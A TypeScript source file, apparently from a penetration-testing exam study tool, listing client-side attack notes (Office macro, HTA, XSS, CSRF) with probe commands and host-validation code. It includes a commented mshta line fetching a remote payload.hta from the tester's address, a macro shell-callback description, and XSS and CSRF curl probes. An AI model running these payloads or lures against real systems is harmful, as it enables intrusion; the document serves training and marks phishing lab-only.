import { hostOrIp } from "./scope-target.ts";

export type ClientNote = {
  id: string;
  title: string;
  labOnly: boolean;
  look: string;
  cmd: string;
  alive: string;
  dead: string;
};

/** Phishing a person is lab-only. A bug in the target's own web app is in scope. */
export const CLIENT_NOTES: ClientNote[] = [
  {
    id: "macro",
    title: "Office macro",
    labOnly: true,
    look: "LAB ONLY. A document that runs a macro when someone opens it. The exam does not ask you to phish a person.",
    cmd: `# lab document, not an exam step
# AutoOpen calls one command you already use for a shell
# the listener is still on your tun0 address`,
    alive: "In a lab, the macro runs and the listener catches a shell.",
    dead: "Macros are disabled, or you are on an exam. Stop. This is not the path.",
  },
  {
    id: "hta",
    title: "HTA",
    labOnly: true,
    look: "LAB ONLY. An HTA is a HTML application Windows runs with mshta. It is a client-side lure, not a check against a service you scanned.",
    cmd: `# lab file, served from the uploads folder
# mshta http://TUN0/payload.hta
# do not send this to a person during the exam`,
    alive: "In a lab, mshta runs and you get the callback.",
    dead: "You are writing an email or a lure for the exam. Stop.",
  },
  {
    id: "xss-r",
    title: "Reflected XSS",
    labOnly: false,
    look: "The target's own page prints a parameter back. One probe. You are not emailing it to anyone.",
    cmd: `curl -s 'http://TARGET/search?q=<script>alert(1)</script>' | head`,
    alive: "The response contains the script tag unchanged. The page will run it in a browser.",
    dead: "The tag is encoded or stripped. One more encoding, then stop.",
  },
  {
    id: "xss-s",
    title: "Stored XSS",
    labOnly: false,
    look: "A field you can save, then a second page that prints it. Still the target application, not a person you contacted.",
    cmd: `# save the probe in the field the app stores
# then request the page that displays it
curl -s http://TARGET/comment/1 | head`,
    alive: "The second page contains the probe. Anyone who opens that page runs it.",
    dead: "The stored copy is encoded. The bug is not there.",
  },
  {
    id: "csrf",
    title: "CSRF",
    labOnly: false,
    look: "A state-changing request with no token, on the target's app. You confirm it with a second browser session, not with a lure sent to a user.",
    cmd: `# the request that changed something, repeated with no CSRF token
curl -s -X POST http://TARGET/profile -d 'email=you@exam.local'`,
    alive: "The change sticks with no token. The action is bound only to the cookie.",
    dead: "A token is required and a missing token is rejected. Stop.",
  },
];

function tunOk(value: string): string | null {
  const host = hostOrIp(value);
  if (!host || host === "localhost" || host === "0.0.0.0" || host.startsWith("127.")) return null;
  return host;
}

/** Replace TARGET and TUN0 only with a checked host. A quote or a semicolon never reaches the command. */
export function clientCommand(note: ClientNote, target: string, tun: string): { command: string } | { error: string } {
  let command = note.cmd;
  if (command.includes("TARGET")) {
    const raw = target.trim();
    if (raw) {
      const host = hostOrIp(raw);
      if (!host) return { error: "The target is one IPv4 address or one host name. No leading zeros." };
      command = command.replaceAll("TARGET", host);
    }
  }
  if (command.includes("TUN0")) {
    const raw = tun.trim();
    if (raw) {
      const host = tunOk(raw);
      if (!host) return { error: "TUN0 is your lab address. 127.0.0.1 is this desk, and the target cannot reach it." };
      command = command.replaceAll("TUN0", host);
    }
  }
  return { command };
}
